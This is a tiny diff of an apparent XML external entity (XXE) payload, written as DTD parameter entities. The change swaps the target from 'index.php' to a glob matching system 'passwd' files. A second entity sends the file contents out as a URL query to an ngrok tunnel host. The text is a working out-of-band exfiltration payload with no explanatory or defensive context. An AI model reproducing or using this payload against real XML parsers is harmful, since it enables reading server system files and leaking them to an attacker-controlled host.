@@ -1,3 +1,3 @@
-<!ENTITY % d SYSTEM "glob://index.php">
+<!ENTITY % d SYSTEM "glob:///*/passwd">
 
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'http://0.tcp.eu.ngrok.io:11889/?x=%d;'>"> 
